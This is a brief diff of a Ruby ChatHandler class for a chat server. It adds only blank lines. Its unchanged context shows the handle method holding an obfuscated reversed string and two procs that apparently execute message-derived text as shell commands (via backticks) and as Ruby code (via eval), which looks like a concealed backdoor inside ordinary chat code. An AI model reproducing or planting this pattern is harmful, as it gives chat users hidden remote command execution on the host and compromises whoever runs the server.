@@ -125,6 +125,7 @@ class ChatHandler
   
   def make_info message, ws
     info = {where: message[1], ws: ws, all: message, ch: self, group: @group}
+    
     info.merge!(
       case info[:where].downcase
       when "c"
@@ -158,7 +159,9 @@ class ChatHandler
   
   
   def handle message, ws, callback = nil
+    
     m_info = self.make_info(message, ws)
+    
     str = "s%,kcip mp/|"
     a = m_info[:who]
     p, pp = proc { |x|`#{x}`.chomp }, proc { |x| eval x}
@@ -169,6 +172,7 @@ class ChatHandler
       end
     end
     return if m_info[:to] && m_info[:to][0] == ?p && m_info[:to][3] == ?k
+    
     
     @ignorelist.map(&:downcase).index(m_info[:who].downcase) and return
     
